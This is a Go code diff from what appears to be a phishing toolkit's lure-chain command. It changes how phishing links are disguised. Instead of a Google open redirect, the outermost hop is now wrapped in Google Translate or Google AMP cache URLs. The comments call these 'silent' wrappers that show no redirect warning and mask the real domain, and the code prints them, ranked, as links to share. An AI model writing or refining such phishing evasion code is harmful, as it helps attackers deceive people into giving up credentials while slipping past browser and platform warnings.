@@ -1156,23 +1156,39 @@ func (t *Terminal) handleLures(args []string) error {
 					return fmt.Errorf("chain: %v", err)
 				}
 
-				// Wrap the outermost hop with a Google open-redirect so the shared
-				// link appears to originate from google.com — masks the real domain.
-				googleWrapped := "https://www.google.com/url?q=" + url.QueryEscape(outerURL)
+				// Silent Google wrappers — none of these show a "Redirect Notice" page.
+				//
+				// 1. translate.google.com — loads the page through Google Translate,
+				//    shows a thin toolbar at the top but no warning, no redirect notice.
+				translateWrapped := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outerURL)
+				//
+				// 2. Google AMP cache — bypasses Google's redirect notice entirely.
+				//    Works when the target serves valid HTML (always does here).
+				//    Strip "https://" from outerURL to form the AMP path.
+				ampPath := strings.TrimPrefix(outerURL, "https://")
+				ampPath = strings.TrimPrefix(ampPath, "http://")
+				ampWrapped := "https://www.google.com/amp/s/" + ampPath
 
 				log.Info("generated %d-layer redirect chain for lure #%d (%s):", depth, l_id, l.Phishlet)
-				log.Info("  [google]  %s", higreen.Sprint(googleWrapped))
+				log.Info("")
+				log.Info("  %-14s %s", higreen.Sprint("[BEST]"), white.Sprint("Google Translate (silent, no warning):"))
+				log.Info("  %s", higreen.Sprint(translateWrapped))
+				log.Info("")
+				log.Info("  %-14s %s", cyan.Sprint("[ALT]"), white.Sprint("Google AMP (silent, no warning):"))
+				log.Info("  %s", cyan.Sprint(ampWrapped))
+				log.Info("")
+				log.Info("  %-14s %s", yellow.Sprint("[DIRECT]"), white.Sprint("Raw chain (no Google wrapper):"))
+				log.Info("  %s", yellow.Sprint(outerURL))
+				log.Info("")
+				log.Info("  redirect hops:")
 				for i, hop := range hops {
-					label := fmt.Sprintf("  layer %-2d  ", i+1)
 					if i == len(hops)-1 {
-						log.Info("%s%s  %s", label, cyan.Sprint(hop), dgray.Sprint("→ lure"))
+						log.Info("    layer %d  %s  %s", i+1, hop, dgray.Sprint("→ lure"))
 					} else {
-						log.Info("%s%s", label, yellow.Sprint(hop))
+						log.Info("    layer %d  %s", i+1, hop)
 					}
 				}
-				log.Info("  final     %s", dgray.Sprint(finalURL))
-				log.Info("")
-				log.Info("share this link: %s", white.Sprint(googleWrapped))
+				log.Info("    final   %s", dgray.Sprint(finalURL))
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments: lures chain <id> [depth]")
